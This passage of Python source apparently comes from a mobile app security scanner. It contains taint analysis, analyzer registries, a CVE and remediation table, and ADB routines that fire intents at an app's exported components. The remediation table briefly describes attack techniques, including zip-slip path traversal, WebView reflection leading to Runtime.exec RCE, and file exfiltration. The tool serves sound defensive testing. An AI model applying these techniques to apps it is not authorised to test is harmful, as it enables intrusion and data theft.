                    if isinstance(src, tuple): src = src[-1]
                    if isinstance(dest, int) and isinstance(src, int):
                        if src in tainted:
                            tainted[dest] = tainted[src]
                        else:
                            tainted.pop(dest, None)
            except Exception:
                pass
            continue

        # const
        if op_name.startswith("const"):
            try:
                operands = ins.get_operands()
                if operands:
                    dest = operands[0]
                    if isinstance(dest, tuple): dest = dest[-1]
                    if isinstance(dest, int):
                        tainted.pop(dest, None)
            except Exception:
                pass
            continue

    return flows


def analyze_taint_interprocedural(ctx: Ctx) -> list:
    """Inter-procedural taint analysis.
    Builds method summaries via fixpoint iteration, then traces each method using
    those summaries so taint flows across method-call boundaries.

    Findings emitted here are marked confidence=likely (vs confirmed for purely
    intra-procedural). Inter-procedural flows are signalled in evidence text.
    """
    findings = []
    if not ctx.dx:
        return findings

    try:
        methods = list(ctx.dx.get_methods())
    except Exception:
        try:
            methods = []
            for cls in ctx.dx.get_classes():
                methods.extend(cls.get_methods() or [])
        except Exception:
            return findings

    # 1. Build summaries (fixpoint)
    log.info("Inter-procedural taint: building summaries...")
    summaries = _compute_summaries(methods, max_iterations=4)

    # 2. Final pass: trace each method with summaries
    seen_signatures = set()
    flow_count = 0
    inter_proc_flow_count = 0

    for ma in methods:
        try:
            m = ma.get_method() if hasattr(ma, "get_method") else ma
            if m is None:
                continue
            try:
                code = m.get_code()
                if code is None:
                    continue
            except Exception:
                continue
            try:
                method_id = f"{m.get_class_name()}->{m.get_name()}"
            except Exception:
                method_id = "?"

            flows = _trace_method_taint_with_summaries(m, summaries)
            for sink_meta, src_kind, evidence, is_inter in flows:
                # Dedup: avoid emitting the same finding from intra + inter
                # passes. We already report intra-procedural flows from
                # analyze_taint(); only report inter-procedural here.
                if not is_inter:
                    continue
                sig = (sink_meta["id"], src_kind, method_id)
                if sig in seen_signatures:
                    continue
                seen_signatures.add(sig)
                flow_count += 1
                inter_proc_flow_count += 1

                findings.append(Finding(
                    id=f"{sink_meta['id']}-inter-{abs(hash(method_id)) % 100000}",
                    title=sink_meta["title"] + " (inter-procedural)",
                    severity=sink_meta["severity"],
                    category=sink_meta["category"],
                    description=sink_meta["description"] + (
                        " This flow was detected inter-procedurally: the source "
                        "and sink are in different methods, connected by a method call. "
                        "Confidence is `likely` rather than `confirmed` because "
                        "inter-procedural analysis can over-approximate when virtual "
                        "dispatch could resolve to multiple implementations."),
                    evidence=evidence[:480],
                    recommendation=sink_meta["fix"],
                    cwe=sink_meta["cwe"],
                    cvss=sink_meta["cvss"],
                    masvs=sink_meta["masvs"],
                    fix=sink_meta["fix"],
                    impact=("Inter-procedural source-to-sink flow observed. "
                            "Attacker-controlled data crosses method boundaries "
                            "before reaching the dangerous sink."),
                    references=[
                        f"https://cwe.mitre.org/data/definitions/{sink_meta['cwe'].split('-')[1]}.html",
                        "https://mas.owasp.org/MASTG/",
                    ],
                    confidence="likely",
                    source="vexa-taint-interproc",
                ))
        except Exception as e:
            log.debug("inter-proc trace failed for one method: %s", e)
            continue

    # =========================================================================
    # Field-based cross-method flow detection.
    # Pattern: methodA writes a tainted value to field F; methodB reads F and
    # the value reaches a sink. The classic setter/getter taint chain.
    #
    # Algorithm:
    #   1) Find all writer methods (summary.fields_written_tainted contains F)
    #   2) Find all reader methods (summary.fields_read_to_sink contains F)
    #   3) For each (writer, reader) pair on the same field, emit a finding
    #
    # We require BOTH methods to be in the same class (or share the field's
    # owner class) to keep this conservative. Cross-class field flows are common
    # but harder to validate without aliasing analysis.
    # =========================================================================
    field_writers = {}  # field_ref -> list of (writer_method_id)
    field_sinkers = {}  # field_ref -> list of (reader_method_id, sink_meta)

    for (cls_name, m_name), summ in summaries.items():
        if summ.unknown:
            continue
        method_id = f"{cls_name}->{m_name}"
        for fld in summ.fields_written_tainted:
            field_writers.setdefault(fld, []).append(method_id)
        for fld, sink_meta in summ.fields_read_to_sink.items():
            field_sinkers.setdefault(fld, []).append((method_id, sink_meta))

    field_flow_count = 0
    for field_ref, sinkers in field_sinkers.items():
        writers = field_writers.get(field_ref, [])
        if not writers:
            continue
        for reader_id, sink_meta in sinkers:
            for writer_id in writers:
                if writer_id == reader_id:
                    # Same method -- already caught by intra-procedural pass
                    continue
                sig = (sink_meta["id"], "field-flow", writer_id, reader_id, field_ref)
                if sig in seen_signatures:
                    continue
                seen_signatures.add(sig)
                field_flow_count += 1
                inter_proc_flow_count += 1

                evidence = (f"Field-based flow: {writer_id} writes tainted value "
                            f"to field {field_ref}; {reader_id} reads same field and "
                            f"value reaches {sink_meta['id']}")
                findings.append(Finding(
                    id=f"{sink_meta['id']}-field-{abs(hash(field_ref)) % 100000}",
                    title=sink_meta["title"] + " (via field)",
                    severity=sink_meta["severity"],
                    category=sink_meta["category"],
                    description=sink_meta["description"] + (
                        " This flow crosses method boundaries via a shared field. "
                        "One method writes attacker-controlled data into the field; "
                        "another method reads the field and uses it in a sink. "
                        "Confidence is `likely` because we don't perform aliasing "
                        "analysis to confirm the same object instance is involved."),
                    evidence=evidence[:480],
                    recommendation=sink_meta["fix"],
                    cwe=sink_meta["cwe"],
                    cvss=sink_meta["cvss"],
                    masvs=sink_meta["masvs"],
                    fix=sink_meta["fix"],
                    impact=("Field-based source-to-sink flow observed across "
                            "method boundaries. Setter / getter pattern that "
                            "stores attacker input and uses it later."),
                    references=[
                        f"https://cwe.mitre.org/data/definitions/{sink_meta['cwe'].split('-')[1]}.html",
                        "https://mas.owasp.org/MASTG/",
                    ],
                    confidence="likely",
                    source="vexa-taint-field",
                ))

    log.info("Inter-procedural taint: %d methods, %d inter-procedural flows "
             "(%d field-based)",
             len(methods), inter_proc_flow_count, field_flow_count)
    return findings


# =============================================================================
# End of taint engine
# =============================================================================


EXTENDED_ANALYZERS_4 = [
    # MASVS-AUTH (5)
    ("jwt-alg-none",                     analyze_jwt_alg_none),
    ("weak-pin-4-digits",                analyze_pin_min_length),
    ("biometric-keyspec-no-user-auth",   analyze_biometric_keyspec_no_user_auth),
    ("session-in-logcat",                analyze_session_in_logcat),
    ("password-reset-deeplink",          analyze_password_reset_deeplink),
    # MASVS-PRIVACY (7)
    ("background-location",              analyze_background_location),
    ("phone-state-non-telephony",        analyze_phone_state_for_non_telephony),
    ("query-all-packages",               analyze_query_all_packages),
    ("manage-external-storage",          analyze_manage_external_storage),
    ("request-install-packages",         analyze_request_install_packages),
    ("advertising-id",                   analyze_advertising_id_usage),
    ("no-flag-secure-on-sensitive",      analyze_screenshot_in_recents),
    # MASVS-RESILIENCE (4)
    ("magisk-detection-missing",         analyze_magisk_detection),
    ("no-play-integrity-on-sensitive",   analyze_no_play_integrity),
    ("no-debugger-check",                analyze_debugger_check_present),
    ("native-no-ptrace-check",           analyze_native_anti_debug),
    # MASVS-NETWORK (3)
    ("okhttp-trust-all-hosts",           analyze_okhttp_trust_all),
    ("volley-allow-all-hosts",           analyze_volley_allow_all_hosts),
    ("cleartext-websocket",              analyze_websocket_no_wss),
    # MASVS-CODE (5)
    ("test-only-apk",                    analyze_test_only_apk),
    ("large-heap",                       analyze_largeheap),
    ("dexclassloader-writable",          analyze_dexclassloader_writable),
    ("rn-dev-mode",                      analyze_react_native_dev_server),
    ("flutter-debug-vm",                 analyze_flutter_debug_mode),
]


ANALYZERS = [
    ("manifest", analyze_manifest), ("permissions", analyze_permissions),
    ("components", analyze_components), ("deeplinks", analyze_deeplinks),
    ("secrets", analyze_secrets), ("webview", analyze_webview),
    ("crypto", analyze_crypto), ("network", analyze_network),
    ("natives", analyze_natives),
] + EXTENDED_ANALYZERS + EXTENDED_ANALYZERS_2 + EXTENDED_ANALYZERS_3 + EXTENDED_ANALYZERS_4 + [
    # Taint analyzers run LAST so they can see findings produced by
    # pattern analyzers. analyze_taint = intra-procedural (confirmed flows);
    # analyze_taint_interprocedural = uses method summaries to chase taint
    # across method boundaries (likely flows).
    ("taint-analysis",                   analyze_taint),
    ("taint-analysis-interprocedural",   analyze_taint_interprocedural),
]


def get_active_analyzers(platform: str = "android") -> list:
    """Return the active analyzer list for a given platform, including any
    analyzers contributed by loaded plugins. Used by the scan pipeline."""
    if platform == "android":
        builtin = ANALYZERS
    elif platform == "ios":
        # IOS_ANALYZERS is defined later -- fall back to lookup at call time
        builtin = globals().get("IOS_ANALYZERS", [])
    else:
        builtin = []
    plugin_extras = [(name, fn) for (name, fn, plat) in _PLUGIN_REGISTRY["analyzers"]
                     if plat == platform]
    return list(builtin) + plugin_extras


# =============================================================================
# CVE / CVSS / Impact / Fix enrichment table
# Maps Vexa finding IDs to known CVE references and structured remediation.
# Applied as a post-processing step over both Android and iOS scans.
# =============================================================================
ENRICHMENT = {
    # ---- Janus signing-block confusion ----
    "janus": {
        "cve": "CVE-2017-13156", "cvss": 7.5,
        "impact": ("On Android 5.0-7.x with v1-only signing, an attacker can prepend a malicious "
                   "DEX to a signed APK without breaking the signature. Result: arbitrary code "
                   "execution as the legitimate app."),
        "fix": ("1) Sign the APK with v2/v3 (APK Signature Scheme v2 or v3, default since "
                "Android Studio 2.3). 2) Set minSdk >= 24 to refuse v1-only updates. "
                "3) Verify `apksigner verify --verbose` shows v2/v3 = true."),
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2017-13156",
            "https://research.google/pubs/pub46467/",
            "https://source.android.com/docs/security/apksigning/v2",
        ],
    },
    # ---- StrandHogg 1.0 (taskAffinity / launchMode) ----
    "task-hijacking": {
        "cve": "CVE-2020-0096", "cvss": 7.8,  # actually StrandHogg 2.0; 1.0 has no CVE
        "impact": ("A malicious app declares the same taskAffinity and launchMode=singleTask, then "
                   "is moved to the front of your task. User taps your app icon and sees the "
                   "attacker's UI -- credential phishing, permission request hijacking."),
        "fix": ("1) Set android:taskAffinity=\"\" on every Activity. 2) Avoid launchMode=singleTask. "
                "3) Set targetSdk >= 30 (Android 11+ has built-in StrandHogg mitigations). "
                "4) Use FLAG_ACTIVITY_NEW_TASK + FLAG_ACTIVITY_CLEAR_TASK on critical Intents."),
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2020-0096",
            "https://promon.io/security-news/strandhogg",
        ],
    },
    # ---- Debuggable / app debuggable ----
    "app-debuggable": {
        "cwe": "CWE-489", "cvss": 7.5,
        "impact": ("Anyone with USB debugging on the device can attach jdb and execute arbitrary "
                   "code in the app's UID -- read SharedPreferences, dump memory, bypass auth checks."),
        "fix": ("1) Set android:debuggable=\"false\" in release builds (the default). "
                "2) Use BuildConfig.DEBUG flags to gate dev features. "
                "3) Verify with `aapt dump badging app.apk | grep debuggable`."),
        "references": [
            "https://cwe.mitre.org/data/definitions/489.html",
            "https://developer.android.com/guide/topics/manifest/application-element#debug",
        ],
    },
    # ---- allowBackup ----
    "allow-backup": {
        "cwe": "CWE-200", "cvss": 5.5,
        "impact": ("`adb backup` extracts the app's private data without root. Includes shared "
                   "prefs, databases, internal files -- often credentials and tokens."),
        "fix": ("1) Set android:allowBackup=\"false\". 2) On Android 12+, also define "
                "android:dataExtractionRules pointing at an XML that excludes sensitive paths. "
                "3) Test with `adb backup -f test.ab <pkg>` (should refuse)."),
        "references": ["https://developer.android.com/guide/topics/data/autobackup"],
    },
    # ---- Cleartext traffic / NSC ----
    "cleartext-traffic": {
        "cwe": "CWE-319", "cvss": 7.4,
        "impact": ("HTTP traffic is interceptable on any hostile WiFi. Tokens, session IDs, "
                   "PII transmitted in plaintext."),
        "fix": ("1) Set android:usesCleartextTraffic=\"false\". 2) Use HTTPS for all endpoints. "
                "3) Configure network_security_config.xml with cleartextTrafficPermitted=\"false\". "
                "4) Audit with `adb shell tcpdump` or Burp Suite."),
        "references": ["https://developer.android.com/training/articles/security-config"],
    },
    "trustmanager-bypass": {
        "cwe": "CWE-295", "cvss": 9.1,
        "cve": None,
        "impact": ("App accepts ANY TLS certificate -- trivial MITM with a self-signed cert. "
                   "Auth tokens, session cookies, payment data all interceptable."),
        "fix": ("1) Remove the custom X509TrustManager / HostnameVerifier. "
                "2) Use OkHttp's CertificatePinner or Network Security Config <pin-set>. "
                "3) Audit with `mitmproxy` or Burp -- traffic should fail to decrypt."),
        "references": [
            "https://cwe.mitre.org/data/definitions/295.html",
            "https://developer.android.com/training/articles/security-ssl",
        ],
    },
    # ---- WebView ----
    "javascript-enabled": {
        "cwe": "CWE-79", "cvss": 6.1,
        "impact": ("WebView with JS enabled + any tainted URL = stored XSS / one-click attack. "
                   "Combined with addJavascriptInterface, it's RCE."),
        "fix": ("1) Disable JavaScript unless required (setJavaScriptEnabled(false)). "
                "2) If required, never load attacker-controlled URLs. "
                "3) Use WebViewAssetLoader for local content, validate every URL before loadUrl()."),
        "references": ["https://developer.android.com/topic/security/risks/webview-unsafe-uri-loads"],
    },
    "js-interface-bridge": {
        "cwe": "CWE-749", "cvss": 8.8,
        "cve": "CVE-2014-1939",  # the most famous addJavascriptInterface RCE
        "impact": ("addJavascriptInterface exposes Java methods to in-WebView JavaScript. "
                   "Pre-Android 4.2 (and any unannotated method) lets JS get a Class<?> via "
                   "reflection -> Runtime.exec(\"sh\") = full RCE in the app's UID."),
        "fix": ("1) Set targetSdk/minSdk >= 17. 2) Annotate every exposed method with "
                "@JavascriptInterface. 3) Minimize the interface surface -- expose only the "
                "specific methods needed. 4) Validate inputs in every interface method."),
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2014-1939",
            "https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/",
        ],
    },
    "webview-file-access": {
        "cwe": "CWE-200", "cvss": 7.5,
        "impact": ("WebView with file:// access loaded from attacker-controlled HTML can read "
                   "arbitrary files in the app sandbox -- shared prefs, databases, internal files."),
        "fix": ("1) setAllowFileAccess(false) (default true on old SDK). "
                "2) setAllowFileAccessFromFileURLs(false). "
                "3) Use WebViewAssetLoader for legitimate local-asset loading."),
        "references": ["https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess(boolean)"],
    },
    "webview-universal-from-file": {
        "cwe": "CWE-942", "cvss": 9.6,
        "impact": ("With setAllowUniversalAccessFromFileURLs(true), file:// pages bypass SOP and "
                   "fetch any cross-origin resource -- exfiltrate files to attacker server."),
        "fix": ("1) Set setAllowUniversalAccessFromFileURLs(false) (default false on API 16+). "
                "2) Never enable on user-controlled HTML. 3) Audit your WebSettings."),
        "references": ["https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs(boolean)"],
    },
    # ---- SQL Injection ----
    "sql-injection": {
        "cwe": "CWE-89", "cvss": 8.6,
        "impact": ("rawQuery() with concatenated user input lets a malicious caller (via exported "
                   "ContentProvider, Intent extras, or deep link parameter) execute arbitrary SQL: "
                   "exfiltrate the entire DB, modify rows, drop tables."),
        "fix": ("1) Use parameterized queries: rawQuery(\"... WHERE id = ?\", new String[]{id}). "
                "2) Use SQLiteDatabase.query() with selectionArgs. "
                "3) Validate type/length before querying."),
        "references": [
            "https://cwe.mitre.org/data/definitions/89.html",
            "https://owasp.org/www-community/attacks/SQL_Injection",
        ],
    },
    # ---- Intent redirection (OVAA pattern) ----
    "intent-redirection": {
        "cwe": "CWE-927", "cvss": 7.4,
        "impact": ("App reads an Intent extra and uses it as the target Intent for "
                   "startActivity/sendBroadcast. Attacker passes an intent referencing the app's "
                   "own internal components -- privilege escalation, local data theft."),
        "fix": ("1) Validate Intent.getComponent() / .getPackage() against an allowlist. "
                "2) Strip FLAG_GRANT_READ_URI_PERMISSION before forwarding. "
                "3) Use explicit intents for internal calls. "
                "4) Set exported=\"false\" on internal components."),
        "references": [
            "https://cwe.mitre.org/data/definitions/927.html",
            "https://developer.android.com/privacy-and-security/risks/intent-redirection",
        ],
    },
    # ---- FileProvider misconfig ----
    "fileprovider-paths": {
        "cwe": "CWE-200", "cvss": 7.5,
        "impact": ("Overly broad <paths> in fileprovider XML lets other apps access app-private "
                   "files via content:// URIs (common: <root-path/> or <files-path path=\"\"/>)."),
        "fix": ("1) Scope paths narrowly: use <files-path name=\"shared\" path=\"shared/\"/> not "
                "the whole files dir. 2) Never use <root-path/>. "
                "3) Set android:exported=\"false\" on the provider; rely on grantUriPermissions."),
        "references": ["https://developer.android.com/reference/androidx/core/content/FileProvider"],
    },
    # ---- PendingIntent mutable ----
    "pendingintent-mutable": {
        "cwe": "CWE-927", "cvss": 6.5,
        "impact": ("Mutable PendingIntent given to another app (notification, AlarmManager) lets "
                   "the recipient modify it -- redirect to attacker-chosen action / target."),
        "fix": ("1) Use FLAG_IMMUTABLE on every PendingIntent (mandatory targetSdk 31+). "
                "2) If mutability is needed, scope to specific extras with FLAG_NO_CREATE."),
        "references": ["https://developer.android.com/reference/android/app/PendingIntent#FLAG_IMMUTABLE"],
    },
    # ---- Zip Slip ----
    "zip-slip": {
        "cwe": "CWE-22", "cvss": 8.1,
        "cve": "CVE-2018-1000035",  # generic Zip Slip
        "impact": ("Unzip without canonical-path validation: archive entry named ../../../../etc/x "
                   "writes outside the destination -- arbitrary file write within the app sandbox, "
                   "or arbitrary execution if the destination is the app's code dir."),
        "fix": ("1) Resolve target = new File(dest, entry.getName()).getCanonicalFile(). "
                "2) if (!target.toPath().startsWith(dest.toPath())) throw new SecurityException(). "
                "3) Reject any entry name containing '..' or absolute paths."),
        "references": [
            "https://snyk.io/research/zip-slip-vulnerability",
            "https://cwe.mitre.org/data/definitions/22.html",
        ],
    },
    # ---- Path traversal ----
    "path-traversal-no-validation": {
        "cwe": "CWE-22", "cvss": 7.5,
        "impact": ("Unvalidated file paths from Intent extras/deep links let attacker read or "
                   "write arbitrary app-sandbox files."),
        "fix": ("1) getCanonicalPath() then startsWith(rootDir) check. "
                "2) Don't blindly accept paths from Intent extras."),
        "references": ["https://cwe.mitre.org/data/definitions/22.html"],
    },
    # ---- Deserialization ----
    "deserialization": {
        "cwe": "CWE-502", "cvss": 8.1,
        "impact": ("Java deserialization of untrusted data is RCE if any gadget chain is reachable "
                   "(jackson-databind, commons-collections, Spring, etc.)."),
        "fix": ("1) Avoid ObjectInputStream entirely. 2) Use JSON with strict schema validation "
                "(Moshi, Gson with TypeAdapter). 3) If you must use Java serialization, use "
                "ObjectInputFilter (API 27+) to allowlist classes."),
        "references": [
            "https://cwe.mitre.org/data/definitions/502.html",
            "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
        ],
    },
    # ---- Runtime.exec ----
    "runtime-exec": {
        "cwe": "CWE-78", "cvss": 8.8,
        "impact": ("Runtime.exec()/ProcessBuilder with concatenated user input is OS command "
                   "injection -- attacker runs shell commands as the app's UID."),
        "fix": ("1) Avoid Runtime.exec for user input entirely. 2) If unavoidable, use the "
                "String[] form (no shell), allowlist binaries, validate args strictly."),
        "references": ["https://cwe.mitre.org/data/definitions/78.html"],
    },
    # ---- Janus successor: signing weak ----
    "v1-only-signing": {
        "cve": "CVE-2017-13156", "cvss": 7.5,
        "impact": "Same as Janus -- v1 signature alone allows DEX-prepend bypass.",
        "fix": "Sign with v2/v3, set minSdk >= 24.",
        "references": ["https://source.android.com/docs/security/apksigning/v2"],
    },
    # ---- Vulnerable libs (per common cases) ----
    "vuln-lib-jackson": {
        "cve": "CVE-2017-7525", "cvss": 9.8,
        "impact": ("jackson-databind < 2.13 has multiple polymorphic deserialization RCE chains "
                   "exploitable when default typing is enabled."),
        "fix": ("1) Upgrade to >= 2.13.4.2. 2) Disable default typing or use a strict allowlist "
                "via PolymorphicTypeValidator."),
        "references": ["https://github.com/FasterXML/jackson-databind/issues/2620"],
    },
    "vuln-lib-bouncy-castle": {
        "cve": "CVE-2024-29857", "cvss": 7.5,
        "impact": "Multiple BouncyCastle CVEs, including ASN.1 / EC import issues.",
        "fix": "Upgrade to >= 1.78.",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-29857"],
    },
    "vuln-lib-okhttp": {
        "cwe": "CWE-295", "cvss": 5.9,
        "impact": "Older OkHttp had cert-pinning bypass and request-smuggling issues.",
        "fix": "Upgrade to >= 4.12.",
        "references": ["https://github.com/square/okhttp/blob/master/CHANGELOG.md"],
    },
    # ---- iOS-specific ----
    "ios-keychain-always": {
        "cwe": "CWE-922", "cvss": 7.5,
        "impact": ("kSecAttrAccessibleAlways means the keychain item is readable even when the "
                   "device is locked. An attacker with physical access can extract credentials."),
        "fix": ("Use kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly or "
                "kSecAttrAccessibleWhenUnlockedThisDeviceOnly. Audit with `objection ios keychain dump`."),
        "references": ["https://developer.apple.com/documentation/security/ksecattraccessibleafterfirstunlock"],
    },
    "ios-ats-arbitrary": {
        "cwe": "CWE-319", "cvss": 7.4,
        "impact": "App Transport Security globally disabled -- HTTP traffic permitted, MITM trivial.",
        "fix": "Remove NSAllowsArbitraryLoads. Use NSExceptionDomains scoped to specific hosts.",
        "references": ["https://developer.apple.com/documentation/bundleresources/information_property_list/nsapptransportsecurity"],
    },
    "ios-debuggable": {
        "cwe": "CWE-489", "cvss": 7.5,
        "impact": "get-task-allow=true permits lldb attach in production -- memory dump, runtime tampering.",
        "fix": "Strip get-task-allow from release entitlements. Verify via `codesign -d --entitlements - app.app`.",
        "references": ["https://developer.apple.com/documentation/security"],
    },
    "ios-uiwebview-deprecated": {
        "cwe": "CWE-1104", "cvss": 5.3,
        "impact": "UIWebView is deprecated, has multiple security issues vs WKWebView, and rejected by App Store since 2020.",
        "fix": "Migrate to WKWebView with appropriate WKWebpagePreferences and content rules.",
        "references": ["https://developer.apple.com/documentation/uikit/uiwebview"],
    },
}


def enrich_findings(findings: list) -> list:
    """Apply CVE/CVSS/impact/fix data to known finding IDs in-place. Returns the list.
    Includes both built-in ENRICHMENT and any enrichment registered by plugins
    via register_cve_enrichment()."""
    # Combined view: plugin entries override built-in if same prefix is registered
    combined = dict(ENRICHMENT)
    combined.update(_PLUGIN_REGISTRY["cve_enrichment"])
    for f in findings:
        fid = f.get("id", "")
        data = combined.get(fid)
        if not data:
            for prefix_id, prefix_data in combined.items():
                if fid.startswith(prefix_id + "-") or fid.startswith(prefix_id):
                    data = prefix_data
                    break
        if not data:
            continue
        if data.get("cve") and not f.get("cve"):
            f["cve"] = data["cve"]
        if data.get("cvss") and not f.get("cvss"):
            f["cvss"] = data["cvss"]
        if data.get("cwe") and not f.get("cwe"):
            f["cwe"] = data["cwe"]
        if data.get("impact") and not f.get("impact"):
            f["impact"] = data["impact"]
        if data.get("fix") and not f.get("fix"):
            f["fix"] = data["fix"]
        if data.get("references"):
            existing = f.get("references") or []
            for url in data["references"]:
                if url not in existing:
                    existing.append(url)
            f["references"] = existing
    return findings


def run_analysis(apk_path: str) -> dict:
    import time
    t0 = time.time()
    log.info("Loading APK: %s", apk_path)
    apk, dexes, dx = AnalyzeAPK(apk_path)
    t_load = time.time() - t0
    log.info("APK loaded in %.2fs", t_load)
    if not isinstance(dexes, list):
        dexes = [dexes]
    ctx = Ctx(apk=apk, dex_list=dexes, dx=dx)

    # Plugin pre-scan hook -- plugins can mutate ctx.extras or veto the scan
    _run_hooks("pre_scan", apk_path=apk_path, ctx=ctx)

    findings = []
    slow_analyzers = []
    # Use the plugin-aware analyzer list so any analyzers contributed by plugins run too
    active = get_active_analyzers("android")
    for name, fn in active:
        ta = time.time()
        try:
            raw = fn(ctx) or []
            # Plugin pre_finding hook can mutate / drop each finding
            for f in raw:
                kept = f
                for hook in _PLUGIN_REGISTRY["hooks"]["pre_finding"]:
                    try:
                        kept = hook(kept)
                        if kept is None:
                            break
                    except Exception as e:
                        log.warning("pre_finding hook %s failed: %s", hook.__name__, e)
                if kept is not None:
                    findings.append(kept)
        except Exception as e:
            log.exception("Analyzer %s failed", name)
            findings.append(Finding(id=f"err-{name}", title=f"Analyzer '{name}' failed",
                                     severity="info", category="meta", description=str(e)))
        elapsed = time.time() - ta
        if elapsed > 0.5:
            slow_analyzers.append((name, elapsed))
            log.info("  > %s [%.2fs]", name, elapsed)
    if slow_analyzers:
        log.info("Slowest analyzers: %s", ", ".join(f"{n}={t:.1f}s"
                 for n, t in sorted(slow_analyzers, key=lambda x: -x[1])[:5]))
    meta = {}
    for k, fn in [("package", apk.get_package), ("version_name", apk.get_androidversion_name),
                  ("version_code", apk.get_androidversion_code), ("min_sdk", apk.get_min_sdk_version),
                  ("target_sdk", apk.get_target_sdk_version), ("main_activity", apk.get_main_activity)]:
        try: meta[k] = fn()
        except Exception: meta[k] = ""
    for k, fn in [("activities", apk.get_activities), ("services", apk.get_services),
                  ("receivers", apk.get_receivers), ("providers", apk.get_providers)]:
        try: meta[k] = list(fn() or [])
        except Exception: meta[k] = []
    try: meta["apk_size_bytes"] = Path(apk_path).stat().st_size
    except Exception: pass

    total_time = time.time() - t0
    log.info("Total scan time: %.2fs (%d findings, %d analyzers)", total_time, len(findings), len(ANALYZERS))

    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings.sort(key=lambda f: sev_order.get(f.severity, 9))
    summary = {s: 0 for s in sev_order}
    for f in findings:
        if f.severity in summary:
            summary[f.severity] += 1
    return {
        "metadata": meta, "summary": summary,
        "findings": enrich_findings([f.to_dict() for f in findings]),
        "extras": {
            "deeplinks": ctx.extras.get("deeplinks", []),
            "natives": ctx.extras.get("natives", {}),
            "permissions": ctx.extras.get("permissions", []),
            "exported_components": ctx.extras.get("exported_components", []),
        },
        "scan_duration_seconds": round(total_time, 2),
    }

# =============================================================================
# ADB Device Interface (offline dynamic testing)
# =============================================================================
class ADBError(Exception):
    pass


def adb_path() -> Optional[str]:
    """Locate adb on PATH or in common Android SDK locations."""
    p = shutil.which("adb")
    if p:
        return p
    candidates = []
    if sys.platform.startswith("win"):
        candidates += [
            os.path.expandvars(r"%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Local\Android\Sdk\platform-tools\adb.exe"),
            r"C:\Android\platform-tools\adb.exe",
        ]
    else:
        home = os.path.expanduser("~")
        candidates += [
            f"{home}/Android/Sdk/platform-tools/adb",
            f"{home}/Library/Android/sdk/platform-tools/adb",
            "/opt/android-sdk/platform-tools/adb",
        ]
    for c in candidates:
        if c and Path(c).exists():
            return c
    return None


async def adb_run(args: list, serial: Optional[str] = None, timeout: int = 30) -> dict:
    """Run an adb command and return {ok, stdout, stderr, code, cmd}."""
    exe = adb_path()
    if not exe:
        return {"ok": False, "stdout": "", "stderr": "adb not found on PATH",
                "code": -1, "cmd": "adb " + " ".join(args)}
    cmd = [exe]
    if serial:
        cmd += ["-s", serial]
    cmd += args
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            try: proc.kill()
            except Exception: pass
            return {"ok": False, "stdout": "", "stderr": f"timeout after {timeout}s",
                    "code": -2, "cmd": " ".join(cmd)}
        return {
            "ok": proc.returncode == 0,
            "stdout": stdout.decode("utf-8", errors="replace"),
            "stderr": stderr.decode("utf-8", errors="replace"),
            "code": proc.returncode,
            "cmd": " ".join(cmd),
        }
    except FileNotFoundError as e:
        return {"ok": False, "stdout": "", "stderr": str(e), "code": -1, "cmd": " ".join(cmd)}


async def adb_devices() -> list:
    r = await adb_run(["devices", "-l"], timeout=10)
    if not r["ok"]:
        return []
    devices = []
    for line in r["stdout"].splitlines()[1:]:
        line = line.strip()
        if not line or "offline" in line:
            continue
        parts = line.split()
        if len(parts) >= 2 and parts[1] == "device":
            d = {"serial": parts[0], "props": {}}
            for p in parts[2:]:
                if ":" in p:
                    k, v = p.split(":", 1)
                    d["props"][k] = v
            devices.append(d)
    return devices


async def adb_install(apk_path: str, serial: Optional[str] = None) -> dict:
    return await adb_run(["install", "-r", "-g", apk_path], serial=serial, timeout=180)


async def adb_uninstall(package: str, serial: Optional[str] = None) -> dict:
    return await adb_run(["uninstall", package], serial=serial, timeout=30)


async def adb_logcat_clear(serial: Optional[str] = None) -> dict:
    return await adb_run(["logcat", "-c"], serial=serial, timeout=10)


async def adb_logcat_dump(package: str, serial: Optional[str] = None, lines: int = 200) -> dict:
    r = await adb_run(["logcat", "-d", "-v", "time", "-t", str(lines)], serial=serial, timeout=15)
    if r["ok"] and package:
        # Filter for lines mentioning the package
        keep = []
        for ln in r["stdout"].splitlines():
            if package in ln or "AndroidRuntime" in ln or "FATAL" in ln:
                keep.append(ln)
        r["stdout"] = "\n".join(keep) if keep else r["stdout"]
    return r


# =============================================================================
# Dynamic test runners — drive the device to actually test findings
# =============================================================================
async def test_exported_activity(package: str, activity: str, serial: Optional[str] = None) -> dict:
    """Launch an exported activity directly, capture result + logcat."""
    await adb_logcat_clear(serial)
    r = await adb_run(["shell", "am", "start", "-W", "-n", f"{package}/{activity}"],
                      serial=serial, timeout=20)
    crash = await adb_logcat_dump(package, serial, lines=100)
    crashed = "FATAL EXCEPTION" in (crash["stdout"] or "")
    return {
        "ok": r["ok"] and not crashed,
        "command": r["cmd"],
        "stdout": r["stdout"],
        "stderr": r["stderr"],
        "crashed": crashed,
        "logcat": crash["stdout"][-4000:] if crash["stdout"] else "",
    }


async def test_exported_service(package: str, service: str, serial: Optional[str] = None) -> dict:
    await adb_logcat_clear(serial)
    r = await adb_run(["shell", "am", "startservice", "-n", f"{package}/{service}"],
                      serial=serial, timeout=15)
    crash = await adb_logcat_dump(package, serial, lines=100)
    return {
        "ok": r["ok"], "command": r["cmd"],
        "stdout": r["stdout"], "stderr": r["stderr"],
        "logcat": crash["stdout"][-4000:] if crash["stdout"] else "",
    }


async def test_exported_receiver(package: str, receiver: str, serial: Optional[str] = None) -> dict:
    await adb_logcat_clear(serial)
    r = await adb_run(["shell", "am", "broadcast", "-n", f"{package}/{receiver}"],
                      serial=serial, timeout=15)
